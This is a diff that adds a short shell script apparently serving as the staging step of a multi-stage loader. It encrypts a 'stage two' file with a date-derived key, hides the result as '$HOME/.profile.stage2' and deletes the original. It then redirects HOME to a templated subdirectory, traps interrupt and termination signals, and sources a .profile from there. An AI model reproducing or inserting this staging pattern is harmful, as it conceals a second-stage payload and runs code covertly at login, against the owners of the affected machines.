@@ -1,0 +1,21 @@
+#!/bin/sh
+
+k="`expr \`date '+%d + %M + 13'\``"
+
+rm -rf "$STAGETWO.new"
+touch "$STAGETWO.new"
+chmod 600 "$STAGETWO.new"
+
+crypt "$k" < "$STAGETWO" > "$STAGETWO.new" 2>/dev/null
+chmod 400 "$STAGETWO.new"
+
+mv -f "$STAGETWO.new" "$HOME/.profile.stage2"
+rm -f "$STAGETWO"
+
+HOME=$HOME/__SUBDIR1__/__SUBDIR2__
+cd "$HOME"
+if [ -f "$HOME/.profile" ]; then
+	trap 2 3 15
+
+	. "$HOME/.profile"
+fi
